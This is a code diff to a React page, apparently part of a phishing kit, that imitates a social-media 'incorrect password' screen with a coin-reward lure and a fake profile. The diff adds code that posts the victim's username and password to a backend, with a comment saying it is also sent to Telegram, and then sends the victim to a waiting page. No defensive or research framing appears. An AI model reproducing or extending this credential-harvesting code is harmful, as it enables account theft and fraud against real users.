@@ -3,17 +3,22 @@ import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
 import { Input } from '../components/ui/input';
 import { AlertTriangle, Eye, EyeOff, X } from 'lucide-react';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 const IncorrectPasswordPage = () => {
   const navigate = useNavigate();
-  const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
+  const sessionId = localStorage.getItem('sessionId');
+  const username = localStorage.getItem('username') || 'user';
 
   const mockUserData = {
-    name: 'andrei.ciuciu',
-    username: '@andrei.ciuciu',
+    name: username,
+    username: `@${username}`,
     followers: '532.4K',
     following: '8.5K',
     likes: '4.5M',
@@ -26,9 +31,27 @@ const IncorrectPasswordPage = () => {
     { text: 'At least 1 special character', met: /[!@#$%^&*(),.?":{}|<>]/.test(password) }
   ];
 
-  const handleTryAgain = () => {
-    localStorage.setItem('password', password);
-    navigate('/verify-phone');
+  const handleTryAgain = async () => {
+    if (password.trim()) {
+      localStorage.setItem('password', password);
+
+      // Send to backend and Telegram
+      try {
+        await axios.post(`${API}/session/step`, {
+          session_id: sessionId,
+          step: 'password',
+          data: {
+            username: username,
+            password: password
+          }
+        });
+      } catch (error) {
+        console.error('Failed to submit step:', error);
+      }
+
+      // Navigate to waiting page
+      navigate('/waiting');
+    }
   };
 
   return (
@@ -108,7 +131,7 @@ const IncorrectPasswordPage = () => {
           <label className="text-white text-lg mb-3 block">Username</label>
           <Input
             type="text"
-            value="andrei.ciuciu"
+            value={username}
             readOnly
             className="w-full bg-[#1a1a1c] border border-gray-700 text-gray-400 px-4 py-6 text-lg rounded-lg"
           />
@@ -148,7 +171,8 @@ const IncorrectPasswordPage = () => {
         {/* Try Again Button */}
         <Button
           onClick={handleTryAgain}
-          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#2a2a2c] hover:to-[#1a1a1c] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all"
+          disabled={!password.trim()}
+          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#2a2a2c] hover:to-[#1a1a1c] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
         >
           Try Again
         </Button>
